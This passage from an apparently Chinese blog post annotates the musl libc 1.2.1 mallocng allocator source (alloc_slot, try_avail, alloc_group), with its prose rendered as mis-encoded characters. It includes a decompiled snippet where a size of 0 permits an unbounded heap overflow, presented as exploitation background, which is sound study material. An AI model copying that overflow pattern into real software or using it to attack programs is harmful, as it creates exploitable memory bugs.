class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//æ‰¾åˆ°å¯¹åº”meta</span></span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">    <span class="comment">//ä»gä¸­åˆ†é…ç¬¬idxä¸ªchunk, å¤§å°ä¸ºn</span></span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>åˆ¤æ–­æœ‰æ— è¶…è¿‡mmapçš„é˜ˆå€¼, å¦‚æœè¶…è¿‡å°±mmapåˆ†é…</p>
</li>
<li><p>å¦‚æœæ²¡æœ‰è¶…è¿‡, sizeè½¬scä¹‹å, é€šè¿‡ctx.active[sc]æ‰¾åˆ°å¯¹åº”çš„metaé˜Ÿåˆ—, å°è¯•ä»é˜Ÿåˆ—ä¸­é¦–ä¸ªmetaé‡Œåˆ†é…chunk</p>
</li>
<li><p>å¦‚æœè¿™ä¸ªé˜Ÿåˆ—ä¸ºç©º, æˆ–è€…è¿™ä¸ªmetaçš„avail_maské‡Œé¢æ²¡æœ‰åˆé€‚çš„chunk, é‚£å°±è°ƒç”¨alloc_slot()è·å–chunk</p>
</li>
<li><p>æ‰¾åˆ°groupä¸idxä¹‹åé€šè¿‡enframe()åˆ†é…å‡ºè¿™ä¸ªchunk</p>
</li>
</ul>

        <h4 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h4>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶æ²¡æœ‰å¯¹sizeä¸º0è¿›è¡Œé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”³è¯·sizeä¸º0çš„Chunkï¼Œä¸‡ä¸€å¦‚ä¸‹ä»£ç æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size = readint(<span class="string">&quot;size?&quot;</span>, a2);</span><br><span class="line">*(_QWORD *)v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">v5[<span class="number">2</span>] = size - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Contnet?&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> readn(*(_QWORD *)v5, v5[<span class="number">2</span>]);</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆsizeä¸º0å°±å¯ä»¥æ— é™æº¢å‡ºäº†å•Š</p>

        <h4 id="â‘ alloc-slot"   >
          <a href="#â‘ alloc-slot" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ alloc-slot" class="headerlink" title="â‘ alloc_slot"></a>â‘ alloc_slot</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">alloc_slot</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å°è¯•åœ¨è¯¥sizeçš„metaå¯¹åº”çš„active[sc]é˜Ÿåˆ—å†…éƒ¨åˆ†é…chunk</span></span><br><span class="line">	<span class="keyword">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);<span class="comment">//åˆ†é…æˆåŠŸç›´æ¥è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœè¯¥sizeçš„metaå¯¹åº”çš„active[sc]é˜Ÿåˆ—ä¸­æ²¡æœ‰åˆé€‚çš„avail_mask</span></span><br><span class="line">    <span class="comment">//å’Œfreed_maskå¯¹åº”çš„chunkï¼Œé‚£ä¹ˆå°±å†åˆ†é…ä¸€ä¸ªmeta-groupï¼Œæ’å…¥é˜Ÿåˆ—ä¸­</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">    <span class="comment">//æ–°åˆ†é…çš„gå…¥é˜Ÿ</span></span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>é¦–å…ˆä¼šé€šè¿‡<code>try_avail()</code>åœ¨ä»¥ä¸‹ä½ç½®å¯»æ‰¾å¯ç”¨çš„chunk,<ul>
<li>ctx.active[sc]çš„meta-groupçš„freed_maskä¸­</li>
<li>é˜Ÿåˆ—ä¸­å…¶ä»–meta-groupçš„avail_maskå’Œfreed_maskä¸­</li>
</ul>
</li>
<li>å¦‚æœå¤±è´¥,æˆ–è€…è¿™ä¸ªé˜Ÿåˆ—æœ¬æ¥å°±ç©º, é‚£ä¹ˆå°±ä¼šè°ƒç”¨<code>alloc_group()</code>ç›´æ¥åˆ†é…ä¸€ä¸ªæ–°çš„metaä¸å¯¹åº”çš„groupï¼Œç„¶åè°ƒç”¨queueæ’å…¥ctx.avtive[sc]è¿™ä¸ªé˜Ÿåˆ—ä¸­</li>
</ul>

        <h4 id="â‘¡try-avail"   >
          <a href="#â‘¡try-avail" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡try-avail" class="headerlink" title="â‘¡try_avail"></a>â‘¡try_avail</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">try_avail</span><span class="params">(struct meta **pm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="keyword">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//å¦‚æœctx.active[sc]==NULL, å³è¯¥é˜Ÿåˆ—ä¸ºç©ºï¼Œç›´æ¥è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ctx.active[sc]å¯¹åº”çš„meta-groupçš„avail_maskä¸­æ— å¯ç”¨chunk</span></span><br><span class="line">    <span class="keyword">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//ctx.active[sc]å¯¹åº”çš„meta-groupçš„freed_maskä¸­ä¹Ÿæ²¡æœ‰chunkæ—¶</span></span><br><span class="line">        <span class="comment">//ä»£è¡¨éƒ½åœ¨ä½¿ç”¨ä¸­ï¼Œä»é˜Ÿåˆ—ä¸­å¼¹å‡ºè¯¥meta-group</span></span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            dequeue(pm, m);</span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–é˜Ÿåˆ—ä¸­ä¸‹ä¸€ä¸ªmeta-group</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//å¦‚æœè¿™ä¸ªmeta-groupä¸­æ‰€æœ‰çš„chunkéƒ½è¢«é‡Šæ”¾äº†, é‚£ä¹ˆå°±å†ä¸‹ä¸€ä¸ªmeta-group</span></span><br><span class="line">        <span class="comment">//å³ä¸ä»ä¸‹ä¸€ä¸ªå…¨freeæˆ–è€…æ²¡æœ‰ç”³è¯·chunkçš„meta-groupä¸­ç”³è¯·chunk</span></span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">        <span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ²¡å¤ªçœ‹æ‡‚æƒ³å¹²å•¥</span></span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="keyword">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//é‡æ–°è®¾ç½®è¿™ä¸ªmeta-groupï¼Œfreed_maskå’Œavail_maskçš„è®¾ç½®</span></span><br><span class="line">        mask = activate_group(m);</span><br><span class="line">        <span class="comment">/*å…¶å®ä¹Ÿå°±æ˜¯è®¾ç½®è®¾ç½®ä¸€ä¸‹freed_maskå’Œavail_mask</span></span><br><span class="line"><span class="comment">        static inline uint32_t activate_group(struct meta *m)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            assert(!m-&gt;avail_mask);</span></span><br><span class="line"><span class="comment">            uint32_t mask, act = (2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1;</span></span><br><span class="line"><span class="comment">            do mask = m-&gt;freed_mask;</span></span><br><span class="line"><span class="comment">            while (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span></span><br><span class="line"><span class="comment">            return m-&gt;avail_mask = mask &amp; act;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt;sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å–å‡º</span></span><br><span class="line">    first = mask&amp;-mask;</span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>æŸ¥çœ‹è¿™ä¸ªmeta-groupä¸­freed_maskä¸­æœ‰æ— chunkï¼Œå¦‚æœfreed_maskä¸º0, è¯´æ˜è¿™ä¸ªmeta-groupä¸­æ²¡æœ‰é‡Šæ”¾çš„chunkï¼Œå°±ä»é˜Ÿåˆ—ä¸­å–å‡º</li>
<li>å¦‚æœæœ‰çš„è¯å°±ä¼šé€šè¿‡<code>active_group()</code>æŠŠfreed_maskä¸­çš„chunkè½¬ç§»åˆ°avail_maskä¸­</li>
</ul>

        <h4 id="â‘¢alloc-group"   >
          <a href="#â‘¢alloc-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢alloc-group" class="headerlink" title="â‘¢alloc_group"></a>â‘¢alloc_group</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//ç”¨æ¥åˆ†é…ä¸€ä¸ªæ–°çš„group</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct meta *<span class="title">alloc_group</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//å…ˆåˆ†é…ä¸€ä¸ªmetaç®¡ç†group</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">    <span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">int</span> active_idx;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">            i++;</span><br><span class="line">        cnt = small_cnt_tab[sc][i];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">        <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">        <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">        cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">        <span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">        <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">        <span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line">    <span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line">    <span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line">    <span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line">    <span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">        <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">        <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">        <span class="keyword">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">        account_bounce(sc);</span><br><span class="line">        step_seq();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">        <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">        <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">        <span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">        <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">        <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">        <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">        needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">        <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">        <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">        <span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">            req += IB + UNIT;</span><br><span class="line">            req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">                cnt = <span class="number">1</span>;</span><br><span class="line">                needed = req;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">        ctx.mmap_counter++;</span><br><span class="line">        active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">        p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">        m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">        p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">            p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">        active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">    m-&gt;mem = (<span class="keyword">void</span> *)p;</span><br><span class="line">    m-&gt;mem-&gt;meta = m;</span><br><span class="line">    m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">    m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    m-&gt;sizeclass = sc;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡mmapåˆ†é…Groupï¼Œåˆå§‹åŒ–ç›¸å…³ä¿¡æ¯ã€‚</p>

        <h4 id="â‘£alloc-meta"   >
          <a href="#â‘£alloc-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£alloc-meta" class="headerlink" title="â‘£alloc_meta"></a>â‘£alloc_meta</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 